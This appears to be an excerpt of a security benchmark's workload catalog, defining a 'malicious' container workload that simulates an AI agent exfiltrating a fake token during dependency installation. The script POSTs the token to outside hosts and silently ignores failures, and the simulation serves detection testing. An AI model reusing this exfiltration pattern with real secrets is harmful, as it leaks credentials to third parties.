...
WORKLOAD_CATALOG = {
    ...
    "agent_dependency_exfiltration": WorkloadSpec(
        key="agent_dependency_exfiltration",
        category="malicious",
        image="python:3.12-alpine",
        command=[
            "sh",
            ...
            (
                ...
                "fake_token = 'raasa-demo-token-not-a-secret'\n"
                "payload = urllib.parse.urlencode({'token': fake_token, 'source': 'agent_dependency_probe'}).encode()\n"
                "targets = ['https://pypi.org/simple/pip/', 'https://example.com/raasa-agent-benchmark']\n"
                "for target in targets:\n"
                "    try:\n"
                "        request = urllib.request.Request(target, data=payload, method='POST')\n"
                "        urllib.request.urlopen(request, timeout=2).read(256)\n"
                "    except Exception:\n"
                "        pass\n"
        ...
        description=(
            "Agent-like dependency-install/exfiltration simulation using fake token "
            "material, repeated outbound transfer attempts, and bounded process fanout"
        ),
        expected_tier="L3",
    ),
}
